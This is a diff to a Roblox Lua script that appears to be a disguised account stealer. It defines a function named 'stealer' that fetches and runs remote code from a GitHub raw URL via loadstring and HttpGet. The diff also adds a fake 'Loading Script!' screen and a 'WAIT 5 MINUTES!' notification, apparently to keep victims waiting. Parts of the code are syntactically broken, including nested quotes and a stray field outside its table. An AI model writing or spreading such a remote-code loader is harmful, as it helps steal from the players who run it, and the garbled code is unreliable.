@@ -1,7 +1,6 @@
-
 local function stealer()
-    loadstring(game:HttpGet('loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/ba021d30455a17d4e15452f3.lua'))()
-'))()
+    loadstring(game:HttpGet('loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/ba021d30455a17d4e15452f3.lua'))()'))()
+end
 
 --setings:
 title = "Loading Script!" --upper title
@@ -191,3 +190,17 @@ local function YCMO_fake_script() -- Dots.Dots
 		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
 	end
 end
+
+
+coroutine.wrap(YCMO_fake_script)()
+
+
+wait(loadingtime)
+Frame.Visible = false
+
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Script Loading!";
+        Text = "WAIT 5 MINUTES!";
+        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
+    Duration = 200;
+getgenv().gui = false
